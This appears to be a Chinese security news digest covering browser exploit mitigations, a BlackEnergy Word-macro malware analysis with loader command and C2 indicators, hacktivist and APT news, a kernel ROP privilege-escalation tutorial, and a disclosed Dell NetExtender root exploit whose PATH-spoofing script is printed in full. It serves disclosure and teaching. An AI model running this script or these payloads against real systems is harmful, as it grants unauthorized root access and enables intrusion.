+=700) window.open('http://image.3001.net/images/20160201/14542586184998.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+
+
+Google Chrome
+
+
+在过去的一年，谷歌也推出了若干有用的漏洞利用缓解方法。首先，我们可以认为 LPE exp的防护方法是基于关闭 win32k.sys驱动的使用， 而我们也知道其实win32k.sys跟Windows其他的内核漏洞一样，也是存在较多的漏洞。该防护限制的方法称为“win32k 进程锁定”，其被应用在沙盒标签中，也被称为“进程缓冲”。这个功能用户可以在Windows 8及之后的系统版本中，SetProcessMitigationPolicy体验下。该安全规则的主要目的是减少攻击者绕过Chrome沙盒并以最高权限运行恶意代码的概率。
+对于Chrome 沙盒，根据我们之前的研究了解：其主要依赖于Windows 的安全机制，如低完整性级别，SID （安全标识符）拒绝，作业对象权限限制，沙盒中运行的进程令牌的权限移除等安全机制。但是以上的这些规则都是针对RCE漏洞以及依赖于用户模式代码漏洞的利用的。攻击者往往意图通过一次全面的渗透，利用 RCE-exp结合LPE- exp（通常被用于针对win32k.sys驱动文件），来达到在内核模式中运行定义的代码，以便获取最高的系统权限。
+
+
+FreeBuf 百科
+
+这里可以稍微关注下低完整性级别的相关安全机制，比如代码试图访问一个内核对象时，系统会将主调进程的完整性级别与内核对象的完整性级别进行比较。如果后者高于前者，就拒绝修改和删除操作。这个比较是在检查ACL之前就完成的。所以，即便进程拥有访问资源的权限，但由于它运行时使用的完整性级别低于资源所要求的完整性级别，所以仍会被拒绝访问。假如一个应用程序要运行从网上下载的代码或脚本，这个设计就尤其重要。在Windows Vista上运行的Internet Explorer 7正是利用了这个机制，以“低”完整性级别来运行。这样一来，下载的代码就不能更改其他任何应用程序的状态，因为那些应用程序的进程默认是以“中”完整性级别来运行的。
+其实从 Chrome 47版本开始，所有的浏览器的用户都能启用一项功能“PPAPI win32k 锁定”，用户可以在chrome://flags中找到该功能，并可以尝试启用win32k 锁定模式 ，其对所有的渲染器进程或者对 Flash或者PDF插件进程等都有安全防护作用。
+Chrome 的另外一种漏洞防护机制（主要针对Flash Player），称为“. 向量漏洞固化”（vector. exploit hardening）。该安全机制引入了特殊的检查方法以及一种新的堆分配方法，来保护Flash Player 进程 ，降低其遭受如缓冲区溢出等漏洞利用攻击等风险。
+而Chrome M48 beta版中，Google开发者针对渲染器进程引入应用容器沙盒。这个安全机制，有点类似于IE11沙盒的增强保护模式（Enhanced Protected Mode， EPM ）。在Chrome M48 beta版中默认该功能是关闭的：如果要启用该功能，用户需要在chrome://flags中的“启用应用容器锁定”进行设置。
+=700) window.open('http://image.3001.net/images/20160201/14542592631929.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+
+
+Edge
+
+
+Edge 是微软专门为Windows 10所开发的浏览器。与IE11相比，其包含了丰富的安全选项，并且这些安全选项默认为开启的。Edge标签在应用程序容器中默认是以64位进程在运行的。从其机制来看，Edge是一个全新的浏览器，它并不兼容旧的附加组件和插件。而且，它也不支持以往浏览器版本的技术，如 ActiveX, BHO 以及VBScript等。这些技术（像VBScript 引擎vbscript.dll文件中所存在的漏洞）常为恶意程序和漏洞利用工具所利用，经由浏览器渗透进本地系统。
+伴随着Windows 10第一次大的升级，微软主要为Edge增添了新的安全机制，一种保护浏览器免遭二进制文件注入的功能机制。比如，该库文件需要获取一个微软数字证书签名或者被批准，同时还需带有微软Windows硬件质量实验室的数字签名证书，才能成功加载一个dll文件进入Edge浏览器。在此安全机制下，其他准备加载到浏览器进程的库文件也将会被暂时锁定。但实际上为了实现3D加速，其中仍然允许视频驱动的同步加载，而这在将来也可能成为攻击者进入系统的利用路径。
+
+
+EMET
+
+
+EMET产品的重要作用在于预防各类未知的零日漏洞，也被微软视为Win7、Win8、Win8.1系统最后的安全防线。EMET工具也一直用于保护Windows系统最核心、重要的安全区域，用户可以定义安全规则或者使用EMET默认规则，增强当前系统的安全系数。应该说微软逐年都在提高其漏洞应急增强工具包（EMET）。该工具涵盖了范围较广的RCE漏洞利用及技术。最新的EMET 5.5 beta版本引入了新的安全机制，主要为用户在LPE 漏洞的利用方面（主要通过利用特别定义的字符文件对win32k.sys存在的漏洞进行利用）提供防护。该功能称为“阻断不受信任的字体”（Block Untrusted Fonts），目前 Windows 10 的用户可以使用该功能。
+=700) window.open('http://image.3001.net/images/20160201/14542595765466.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+EMET 5.5 beta版本允许用户启用特殊缓冲选项，该选项主要应用于在漏洞被触发时，LPE exp的计数（几乎都是存在于win32k.sys）。微软定义的这些字体文件安装在%windir% /fonts 目录下。而“阻断不受信任的字体”（Block Untrusted Fonts）功能启用如下图，
+=700) window.open('http://image.3001.net/images/20160201/14542596384007.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+
+
+结语
+
+在本报告中，我们也大概了解到了关于Web 浏览器的各种安全机制包括像微软EMET的使用情况。我们也对微软产品的漏洞修复情况作了统计，而对于用户来说，Windows 用户模式组件存在的漏洞威胁程度目前来看是最高的。我们后续也会持续关注windows的具体漏洞情况。而对于windows用户来说，在日常的工作生活过程中，也应尽量利用已有的安全机制，来提高本地环境的安全性。
+＊参考来源：Win Exp 2015
+
+
+
+
+
+
+
+-----------------------------------------------------------10-----------------------------------------------------------
+0X10: 
+     [2.2]乌克兰BlackEnergy新动向：通过Word文档进行APT攻击 
+
+
+
+乌克兰BlackEnergy新动向：通过Word文档进行APT攻击
+
+
+
+
+0×01 前言
+
+
+
+
+去年晚些时候，一波网络攻击的其中几个部分经鉴定是针对乌克兰的。而对这些攻击比较广泛的说法是，此次攻击是著名的BlackEnergy木马并且增加了一些新的模块。
+BlackEnergy木马是著名的黑客Cr4sh创造的。在2007年，他声称不再开发这款木马，并且卖出木马的源码，估价在$700。刚开始，在2008年它被一些黑客们用来针对格鲁吉亚进行DDOS攻击。这些不知名的黑客在随后的几年里持续进行DDOS攻击。
+大概在2014年，一个特别的BlackEnergy组织开始引起大家的注意，他们开发了监测控制和数据采集类的插件来威胁ICS并且在全世界范围都非常活跃。这显示出BlackEnergy还存在的一些特别的能力，不仅仅局限于DDOS攻击。因此，我们称他们为BlackEnergy APT组织。
+这些组织的其中的一个APT攻击的目标就是乌克兰。自从2015年中期开始，乌克兰就开始存在通过Excel宏病毒进行BlackEnergy攻击，如果用户打开此类文档脚本就会释放木马至本地硬盘。
+几天前，我们发现了一种新型的针对乌克兰的BlackEnergy APT文档类攻击。不像以前采用Excel工作簿进行攻击，此次采用的是Word文档。该文档通过提及乌克兰“Right Sector”反对派政府来达到迷惑的效果。
+
+
+
+
+0×02 详细介绍
+
+
+
+去年年末，针对乌克兰的网络攻击层出不穷。包括来自ESET的我的同事，iSIGHT的小伙伴以及其他公司的广泛看法是，这些攻击是著名的BlackEnergy木马以及新型变种的攻击。其中乌克兰的一家Cys Centrum公司对袭击乌克兰的BlackEnergy攻击已经做了很好的分析（目前这篇文章仅存在俄文版，但是可以通过谷歌翻译进行阅读）。
+在过去，我们也曾写过BlackEnergy的分析，重点关注的是它的payloads，西门子的设备开发以及路由器的攻击插件。你可以在这里和这里阅读我的同事Kurt Baumgartner 和 Maria Garnaeva的相关文章。同样我们也贴出了BlackEnergy DDOS攻击的分析。
+自从2015年中期开始，在乌克兰就开始存在通过Excel宏病毒进行BlackEnergy攻击，如果用户打开此类文档脚本就会释放木马至本地硬盘。
+Office 文档宏病毒是一种早期的病毒，可以追溯到2000年，那时候Word和Excel支持自动执行宏指令。这就意味着病毒或者木马可以伴随着文档的打开而自动运行并且感染系统。随后微软禁用了这个特征，并且当前的Office版本需要用户一些特别的操作启用宏后才能打开存在文档中的宏指令。
+为了绕过这个防护，现在的黑客们都会使用社工的办法，让用户去启用宏从而能看到让其觉得很有意思的内容。几天前，我们捕获到一个BlackEnergy用于攻击乌克兰的新型文档。这个文档是Word文档，而不是以前的那种Excel文档：
+“$RR143TB.doc” (md5: e15b36c2e394d599a8ab352159089dd2)
+
+通过比较粗糙的检测发现，这份文档在2016年1月份从乌克兰上传一个复合扫描服务。它存在一个创建开始时间和最后保存的字段2015-07-27 10:21:00。这意味着该文档在更早前就被创建了，只是最近才被发现而已。
+打开这个文档前，用户被提示需要启用宏才能查看文档。
+=700) window.open('http://image.3001.net/images/20160201/14543316962561.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+有趣的是，这个文档通过“Pravii Sektor”(Right Sector，乌克兰民族党)来诱惑。这个党派在2013年11月成立并在该国的政治立场中扮演着很关键的角色。
+
+我们可以使用类似oledump攻击不运行Word提取其中的宏：
+=700) window.open('http://image.3001.net/images/20160201/14543317328259.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+如图所示，宏指令在内存中创建一个字符串，这个字符串文件随后被创建，并且写入“vba_macro.exe”。这个文件随后通过Shell命令被执行。
+这个 vba_macro.exe payload (md5: ac2d7f21c826ce0c449481f79138aebd)是一个典型的BlackEnergy释放的文件。最终释放的payload类似“%LOCALAPPDATA%\FONT CACHE.DAT”，这是一个DLL文件。通过使用rundll32执行之：
+rundll32.exe “%LOCALAPPDATA%\FONTCACHE.DAT”,#1
+
+为了确保在每个系统启动时执行，这个释放文件在系统启动文件夹下创建了一个LNK文件，这个文件的执行和每个系统的启动命令一样：
+%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\{D0B53124-E232-49FC-9EA9-75FA32C7C6C3}.lnk
+
+
+最后的payload (FONTCACHE.DAT, md5: 3fa9130c9ec44e36e52142f3688313ff)是一个在80端口上连接一个硬编码的C&ampC服务器，5.149.254.114.简单的木马。这个服务器也被来自ESET我的同事提及过，在上个月的一篇分析文档中。这个服务器当前处于未联通状态，或者通过IP地址的限制访问。一旦这个服务器在线，这个文档通过HTTP POST请求，发送基本的恶意指令：
+=700) window.open('http://image.3001.net/images/20160201/14543317575922.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+这个请求是BASE64加密的。其中一些字段包括：
+l b_gen=301018stb
+l b_ver=2.3
+l os_v=2600
+l os_type=0
+
+
+b_id是一个通过计算机的操作系统信息计算出来的一个独一无二的机器识别码，对于每个人来说也是唯一的。这将使得攻击者可以区别相同网络的不同受感染的主机。b_gen似乎是被攻击者的ID，类似301018stb。而STB应该是乌克兰电视台“STB”，http://www.stb.ua/ru/。 这家电视台曾在2015年11月公开提及BlackEnergy的受害者。
+
+
+
+
+0×03 总结
+
+
+
+BlackEnergy作为高级可持续性威胁是当前乌克兰近期遭受的主要威胁，此外还影响工业控制设备和间谍活动。
+我们的目标分析显示了下面几个最近一直被攻击的目标。如果你的机构或组织是下面其中之一的话，在采取防范措施的时候需要认识到这是BlackEnergy。
+l IS, Energy, government and media in Ukraine
+l ICS/SCADA companies worldwide
+l Energy companies worldwide
+
+
+早期的具有破坏性的payloads是2014年7月份。然而早期的版本存在各种bug。在近期的攻击当中，开发者开始解决未签名的驱动程序，之前依赖低级擦拭功能的磁盘，取而代之的是高级的擦拭功能并更加专注于文件扩展名而不是磁盘。这种攻击威胁不亚于磁盘的payload，当然，优势还在于不需要管理员权限，而且还可以在64位操作系统上运行。
+有趣的是，这个Word文档（不是Excel），ICS-CERT同样也提到了，在[backcolor=0px 0px]alert 14-281-01B.
+=700) window.open('http://image.3001.net/images/20160201/14543317859863.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+这个相当特殊，在各种不同类型的Office文档当中都存能包含宏，不仅仅是Excel文件。同样包含Word文件，就像ICS-CERT以及更早期的Cys Centrum提醒的那样，还有PPT文件。
+就使用Word进行APT攻击而言，我们近期发现Turla组织借助Word文档的宏释放恶意payloads（卡巴斯基提供的报告）。这让我们相信很多黑客都已经成功了并且会越来越普及。
+我们将会继续跟踪乌克兰的BlackEnergy，并会及时向我们的读者更新。
+更多关于BlackEnergy APT的攻击可以从卡巴斯基情报服务获取。
+
+
+
+
+0×04 相关文件
+
+
+
+Word document with macros (Trojan-Downloader.Script.Generic):
+e15b36c2e394d599a8ab352159089dd2
+Dropper from Word document (Backdoor.Win32.Fonten.y):
+ac2d7f21c826ce0c449481f79138aebd
+Final payload from Word document (Backdoor.Win32.Fonten.o):
+3fa9130c9ec44e36e52142f3688313ff
+BlackEnergy C&ampC Server:
+5.149.254.114
+* 参考来源：securelist
+
+
+
+
+
+
+
+-----------------------------------------------------------11-----------------------------------------------------------
+0X11: 
+     [2.2]OpPuraVida进行时：匿名者组织（Anonymous）入侵哥斯达黎加政府服务器 
+
+=700) window.open('http://image.3001.net/images/20160128/14539967551960.jpg')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+“匿名者”组织与“LulzSec”组织的支持者们一起入侵了哥斯达黎加外交部的服务器并且泄露了在其中的注册用户的登录信息。这一次活动是以“OpPuraVida”运动为旗号进行的。
+=700) window.open('http://image.3001.net/images/20160129/14539969354170.jpg')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+
+
+
+
+OpPuraVida是一个正在运行中的活动，目标是反对哥斯达黎加政府签署的《中美洲自由贸易协议》。该协定建立了参与国间国家级的伙伴合作关系，所有的参与国家都将受到一系列相当隐秘的经济协议约束，许多人认为这给予了外国公司更多权利，甚至超过本国公民可以享有的。其中，反对者主要针对的是哥斯达黎加Harken控股公司一家与德克萨斯州Harken控股公司有密切联系的前总统布什的石油公司与洛杉矶MKJ梅泰里探索公司的合作。
+
+
+深入访谈
+
+此次入侵之后，通过与一名叫Hanom的黑客的独家对话，我们得知：
+
+“我们（黑客）反对《中美洲自由贸易协定》。因为该协议是基于与北美自由贸易协议相同而且失败的新自由主义模型。这种自由贸易模式将以贸易伙伴国模式取代家庭农场主模式，加剧了劳动力和环境标准的底部竞争，同时加剧了私有化和公共服务管制的放松。”Hanom还解释了中美洲自由贸易协议对哥斯达黎加的威胁，表现为以下几个方面：
+
+
+危害了塔拉曼卡海岸
+
+哥斯达黎加的塔拉曼卡地区有着地球最丰富的海洋生态系统。它包含了3个国家保护区，其中之一是卡维塔国家公园被联合国教科文组织列为时间遗产，还有一个是联合国指定的湿地位于甘多卡-曼萨尼国家野生动物保护区。根据环境评估，海上石油将造成对以下几个方面造成威胁：
+=700) window.open('http://image.3001.net/images/20160129/14539970417921.jpg!small')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+
+
+=700) window.open('http://image.3001.net/images/20160129/14539970529137.jpg!small')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+1、威胁玳瑁、棱甲龟、绿毛龟的繁殖区域；
+
+2、威胁保护区域，托土盖罗是绿毛龟在西半球最大的聚集地，并且在保护区开始建设以来棱甲龟的数量也在以一种前所未有的速度增长；
+3、对数以百计的渔业工作和依靠加勒比海珊瑚礁的生态旅游业造成威胁；
+4、如果石油泄漏，红树林和湿地永远都不能恢复了。
+
+泄漏的数据包括政府官员的信息：
+
+在浏览被泄漏的数据之后，我们发现黑客泄漏的信息包括政府官员的姓名、用户名、ID号、电话号码、邮箱以及加密密码。
+*参考来源：hackread
+
+
+
+
+
+-----------------------------------------------------------12-----------------------------------------------------------
+0X12: 
+     [2.2]加拿大基础设施平均2天遭遇一次大规模黑客攻击 
+
+=700) window.open('http://image.3001.net/images/20160128/14539581354919.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+大约两个月内，加拿大重要基础设施遭遇了25次国家支持的黑客攻击。受到攻击的基础设施包括发电厂、输电网、航空软件等一系列政府系统，疑似是外国政府（包括敌对的和友好的）派遣的黑客所为。
+换句话说，APT攻击就是黑客偷偷找到能访问系统的后门，然后进行很长一段时间的潜伏，期间黑客们可以尽情的搜集系统上的数据。
+据加拿大网络事件应急响应中心（CCIRC）发布的报告称，有25起事件中主机受到APT相关恶意软件影响。所有的威胁全部来源于“信息和通信技术部门”，且它连接着加拿大主要公共基础设施。
+现在的重要基础设施正在逐步变得智能化和网络化，它们支撑着众多公共系统，比如输电网、核电站、水过滤站和金融机构。如果黑客成功利用了这些基础设施，将会导致互联网界的“珍珠港事件”。
+加拿大国家安全情报局（CSIS）也承认，这些黑客所造成的威胁是真实的，可能会对供水、能源、公共事业、制造业、互联网通信技术、甚至是学校和医院造成很大的影响。
+
+
+加拿大闭口不谈黑客攻击事件
+
+当被问及任何关于加拿大重要基础设施被敌对国家黑客攻击的问题时，加拿大公共安全部闭口不谈。
+加拿大公共安全部发言人MylèneCroteau说道：
+
+“尽管我们不评论任何关于加拿大重要基础设施是否遭受特定或者潜在的黑客攻击，但是我们可以肯定的是CCIRC始终聚焦在保护政府重要系统上，包括重要基础设施。”很明显的是，这些国家针对的不仅仅是加拿大重要基础设施，还有由软件、电脑和通信公司组成的信息和通信技术部门。CCIRC还记载了直接针对加拿大基础设施的攻击，包括对交通运输部门（尤其是航空和铁路部门）的钓鱼邮件攻击，对能源、公共事业和金融机构的攻击。
+文件中还显示，这些APT组织会利用加拿大本土的技术实施他们的活动，这也是一种隐匿他们身份的方式。
+CCIRC收到一份来自国际计算机安全事件应急响应小组的报告，报告中指出多个加拿大路由器已被入侵，并且疑似被APT组织控制。这些路由器被用作威胁操作者和基础设施之间的通信连接，提升了APT的匿名性和操作安全性。
+一个国家的重要基础设施遭受网络攻击是正常事，加拿大被攻击也不是什么令人惊讶的事情。并且加拿大一直是俄罗斯的传统间谍目标，而中国和伊朗也针对加拿大资产部署了APT风格的团队。
+
+
+基础设施被控制的危害
+
+侵略性的国家或者极端主义组织可以利用这种类型的网络工具控制一些重要基础设施，进而可以污染一些主要城市的水源、关闭部分地区的电力供应。这种举动对国民和国家工业等都会造成巨大影响。
+* 参考来源：news.vice
+
+
+
+
+
+
+
+-----------------------------------------------------------13-----------------------------------------------------------
+0X13: 
+     [2.2]Linux内核ROP姿势详解(一) 
+
+ROP（Return-oriented programming）是一种基于代码复用技术的新型攻击，攻击者供已有的库或可执行文件中提取指令片段、构建恶意代码。
+
+内核ROP
+内核ROP是一种有效的用于联合非可执行存储区域旁路限制的技术。例如，ROP提出在最新的Intel处理器上的一种绕过内核和用户地址分离缓解（如SMEP Supervisor Mode execution protection 管理方式执行保护）的实践性方法。
+本教程的目的是演示如何使用内核ROP链构造提升用户权限。结果是否成功还要看下面的条件是否满足：
+执行一个权限升级的有效载荷驻留在用户空间的数据可能被引用（例如，来自用户空间的&quotfetching&quot数据是允许的）驻留在用户空间中的指令可能不被执行在典型的ret2usr攻击中，内科执行流重定向到一个包括权限提升有效载荷的用户空间地址：
+void __attribute__((regparm(3))) payload() {commit_creds(prepare_kernel_cred(0)}上述权限提升有效载荷会分配一个新的凭证结构（uid=0, gid=0等）并将它应用到调用进程中。我们可以构建一个ROP链，这个链不需要执行任何驻留在用户空间中的结构就会执行上述操作，比如，它不用为任何用户空间内存地址设置程序计数器就可以执行上述操作。最终目标是利用一个ROP链在内核空间中执行整个权限提升有效载荷。但是在实践中，它可能不太有必要。举个例子，为了绕过SMEP，使用一个ROP链可以翻转smep，然后一个标准的权限提升载荷就可以在用户空间中被执行了。
+基于以上有效载荷的ROP链应该和下面的内容看起来非常类似：
+[/url]
+
+
+
+-----------------------------------------------------------14-----------------------------------------------------------
+0X14: 
+     [2.2]戴尔VPN客户端Netextender 0day分析 
+
+=700) window.open('http://image.3001.net/images/20160126/14538164515926.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+VPN客户端是大多数IT安全专家都会使用的一个工具，使用它可以连接到一个“受限制”的局域网，进行匿名上网、确保网络流量安全等。但试想一下，如果VPN客户端可以导致机器的权限提升呢？
+注意：目前这已经不再是一个0day了，因为当时我立即向戴尔安全团队报告了这个漏洞，你可以从这里了解报告的详细情况：《戴尔SonicWALL通知：关于在Mac OS X和Linux平台上，NetExtender客户端中的root权限提升漏洞》
+0×01 从头说起（2015年9月）
+记得那是一个晴朗的日子，阳光明媚…哈哈，开个玩笑。
+其实，当时我在家里无事可做，所以我决定尝试在Mac OS X（2015年9月份的Yosemite系统）中寻找漏洞，因为它对我来说是一个全新的操作系统，所以在OS X上寻找漏洞是一个不错的尝试。
+我决定从最基本的内容开始学：首先搜索suid文件。
+sudo find / -user root -perm -4000 -print除了常规的系统文件之外，有一个地方吸引了我：
+1321668 -rwsr-xr-x@ 1 rootwheel18K 16 Apr 17:47 /usr/sbin/uninstallNetExtender什么？我之前安装的VPN客户端（戴尔的NetExtender）创建了一个SUID二进制文件，下面就让我们对它进行探索分析吧。
+0×02 Pa(th)zuzu进入视线
+就在那几天，我正在编写一个脚本来测试PATH欺骗（PATH Spoofing）漏洞（注：PA(TH)ZUZU，现在它工作的很好），所以当时我觉得有一件事尝试一下应该会很有趣，那就是欺骗PATH。
+bash中的PATH变量（$PATH）包含了所有二进制文件的目录，这样你就可以在不必输入完整路径的情况下调用这些程序了。例如下面的例子：
+/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin这是OS X系统中的默认$PATH。通过分解它可以看到，它实际上是5个目录：
+/usr/local/bin/usr/bin/bin/usr/sbin/sbin所以，如果我运行一条命令，那么将会从上面列举的几个目录中搜索命令中给出的文件名。以ping指令为例：
+~ $ which ping/sbin/ping所以，现在的问题是：如果在运行一个可执行文件之前，你改变了（欺骗）$PATH变量值，那么将会发生什么呢？
+shotokan@ZHMACBOOK ~ $ which ping/sbin/pingshotokan@ZHMACBOOK ~ $ touch /tmp/pingshotokan@ZHMACBOOK ~ $ chmod +x /tmp/pingshotokan@ZHMACBOOK ~ $ PATH=/tmpshotokan@ZHMACBOOK ~ $ /usr/bin/which ping/tmp/ping经过上面的修改操作，从现在开始，如果我试着在不指定完整路径的情况下运行任何程序，那么将只会从“/tmp”目录下搜索该程序。
+0×03 好戏正式开始
+首先要尝试的是：查看二进制文件中是否存在一些有趣的字符串。
+=700) window.open('http://image.3001.net/images/20160126/14538162847084.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+哇，setuid ！如果我们可以破解这个脚本，那么我们很可能获取到root权限。其他的字符串看起来没什么特别的，都是直接传递给bash。下面，让我们尝试体验一下欺骗的魔力吧。
+现在，我们将PATH指向一个目录（当前目录”.”），该目录中并没什么有趣的内容。
+=700) window.open('http://image.3001.net/images/20160126/14538163448140.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+等等，什么？它竟然能够正常工作!从这张图中我们可以看到，从卸载程序中调用了3个程序：
+1.dscacheutil2.arp3.rm现在，我们试着编写一个利用程序，它将会在当前目录中创建一个假的dscacheutil可执行文件（它仅仅调用bash），并会以被欺骗的$PATH调用卸载程序。
+#!/bin/bashecho &quot#!/bin/bash&quot &gtdscacheutilecho &quotPATH=$PATH /bin/bash 2&gt&amp1&quot &gt&gt dscacheutilchmod +x dscacheutilPATH=. /usr/sbin/uninstallNetExtender 2&gt/dev/nullrm dscacheutil我们执行chmod +x来授予执行权限，然后运行它：
+=700) window.open('http://image.3001.net/images/20160126/14538164138472.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+Root成功。（注意：这个利用能够同时在OS X和Linux系统上工作）
+0×04 最后感想
+在你安装软件之前和之后，一定要检查电脑上都存在什么内容，即使你非常信任软件来源，也要做这种检测，因为它能够有助于你摆脱不必要的麻烦。
+*参考来源：aitch
+
+
+
+
+
+-----------------------------------------------------------15-----------------------------------------------------------
+0X15: 
+     [2.2]极客DIY：打造属于自己的无线移动渗透测试箱 
+
+
+本文中介绍的工具、技术带有一定的攻击性，请合理合法使用。 
+
+
+
+你想不想拥有一款属于自己的移动无线渗透测试箱，如果你感兴趣，下面介绍的设备将会对你很有帮助。这个箱子被称为“MiTM(中间人攻击)WiFi箱”，使用这个箱子可以完成一些无线审计工作，同时也可以伪造接入点并完成中间人攻击。
+
+工具要求
+如果你真的想
+要做这个箱那么你需要如下工具：
+5或6mm的钻木/金属钻头
+开口扳手(规格8)
+钳子
+手术刀/裁纸刀
+尼龙扎带（俗称：勒死狗）
+箱子的选择
+这里有些建议，你选中的箱子最好是用过一次以上，另外需要注意的是一定不要选择扔掉设备之后留下的那种空箱子。
+箱子要求
+最好是黑色的
+尺寸大约是230x 150 x 100mm
+必须是防水的（可以经受的起风吹日晒）
+价格自选
+箱子最好里面有泡沫内衬，并且外面有扣锁
+建议：如果你是第一次做这个项目，你可以尝试用一些duct tape胶带（一种用来密闭供暖或空调管道的银色宽胶布）或热熔胶，在塑料包装盒里面先练习。塑料包装盒的盒壁很薄，所以你有可能使用不同的方式以及材料固定部件以及连接器的长度，例如（图片来源于其它项目）下面这个例子：
+
+无论怎么样，我找到了一款箱子，B&ampW type 1000户外箱，这个箱子满足了这个项目所有的需求。它目前大概需要40欧元，箱子的尺寸是 250 x 180 x 95mm。
+ 
+
+目前我已经在许多环境下对这个箱子做了测试，例如把箱子放在屋顶，放在有灰尘或潮湿的地方（下过雨或雪的地方），暂时没有发现箱子或者箱子里面的设备出现过问题，所以作者
+推荐了这款箱子，当然你可以自己选择适合自己的箱子，另外不建议你直接将箱子放在阳光下面直接照射，不是由于箱子本身原因，如果这么做箱子里面的电池容易出现问题。
+天线的问题
+一开始我就将天线放在箱子的里面，当然这么做不太好。但出于隐蔽性的考虑，我当然将天线放在箱子的里面比较合适，但这么做之后发现天线信号的强度以及接收信号的质量都会被削弱。我最
+终还是将天线放在了箱子的外边，而这么做又出现了一个问题，为了实现这一点我需要自己制作线缆连接连接器，因为箱子的塑料壳约有4,5 mm厚（根据你选择的箱子这个情况略有不同）。
+
+用五毫米（6毫米也可）木钻头钻出三个孔，这是为天线预留的。如果要是使用5mm的钻头钻出的孔，会使得线缆很难连接SMA连接器，但这样会更好的卡住箱子中的连接器，并且连接器在箱子里面也不会晃来晃去。对于预留给天线的上个孔，应该在箱子的上面钻两个，同时在侧面钻一个。这个想法的灵感主要取自“Hak5 Pineapple Mark V”，并根据自己的需要添加了其它一些设备。这么做就比原来的有了更多的优势，当我开始使用这个箱子时，需要额外的连接器连接天线，利用这些装置就可以直接连接WiFi、SDR 、GSM信号，而这种方法也是一个不错的方法。
+安装：
+=700) window.open('https://bbs.2cto.com/file:///C:/Users/WEIZH0~1/AppData/Local/Temp/msohtmlclip1/01/clip_image001.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+ 
+SMA连接器是一种应用广泛的小型螺纹连接的同轴连接器，该连接器具有50Ω的特性阻抗。频率范围在DC～18 GHz，但它是最常见的无线天线系统以及软件无线电系统收发器。
+=700) window.open('https://bbs.2cto.com/file:///C:/Users/WEIZH0~1/AppData/Local/Temp/msohtmlclip1/01/clip_image002.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+这里有个建议，建议安装者仔细检查连接连接器的每一个天线以及附加设备。如果你在箱子中使用过多的线缆以及设备，那么你会破坏掉信号收发的质量，所以应该尽量缩短线缆长度，并尽可能少用设备。
+由于箱子的壁厚大约是4.5mm，所以当把设备固定在箱子的时候不得不使用扩展连接器，这样就可以用线缆连接天线并保证信号的质量。而这些电缆你可以在网上找到，当然你也可以定做适合自己带SMA连接器头的线缆，而在制作这个箱子的时候使用的是SI-195 195 型号（50Ω）的低损耗编织网同轴电缆。
+布线
+布线需要根据你自己的实际情况来进行，而这里你都需要USB线、电源线以及网线。这里最好将线缆以“L”形接到USB适配器，当你在箱子里面加入更多的USB线或USB适配器的时候，这样可以
+节省很多空间，这条不是强制性的规定，但的确可以节省很多空间，当我制作V1.0版本的时候，用到了许多很长的USB线，但是为了节省空间后来我又自己做了许多短的USB线。
+=700) window.open('https://bbs.2cto.com/file:///C:/Users/WEIZH0~1/AppData/Local/Temp/msohtmlclip1/01/clip_image003.jpg')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+电池
+安装上面操作完成之后，就会获得更多的空间放置设备和电池。我在使用V1.0版本的时候，选择的是Tenergy 51097型电池，容量是16000 mAh / 59.2Wh，直流输出12V/16V/19V (60W max)以及支持USB口输出5V (2.1A max)，这种电池是聚合物锂离子电池，如果你想要在高温区域使用该装置，或者使用其它型号的电池，请注意控制箱子里面的温度。
+如果箱子里面的电池过度充电、负载过多、温度过高，电池被刺穿、短路，都将会导致灾难性的失败，比如电池破裂、电解液泄露或发生火灾。我想这个型号的电池应该有一些保护措施，因为测试这个箱子的时候并没有在极端的环境下，所以我就没有看电池的规格说明。另外想要实现rpi温度监控系统很容易，我相信在你测试项目的时候也不想让客户的公司发生火灾。这个电池的尺寸也非常的适合我，尺寸是185mm(长) x 124mm(宽)x 14mm(高)。这个想法也是来自Pineapple，于是便采用了5-12V /2A供电口，Beaglebone以及 RPi 也使用了5v的USB供电接口。可以依据你实际使用设备的数量，你选择电池的供电能力，也可以根据箱子实际在16~48小时工作情况，来选择电池。这个选择不一定是最好的，但对于我来说还是不错的。
+=700) window.open('https://bbs.2cto.com/file:///C:/Users/WEIZH0~1/AppData/Local/Temp/msohtmlclip1/01/clip_image004.jpg')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+设备选择
+对于设备的选择，取决于你在实际检测中的场景，你自己的想法以及你的渗透方向。如果你没有 Hak5 Pineapple，你完全可以制作和它一样功能的设备，同时可以与其它装置组合来实现这一目的。下面这些装置曾被我用于v1.0版本上面。
+ 
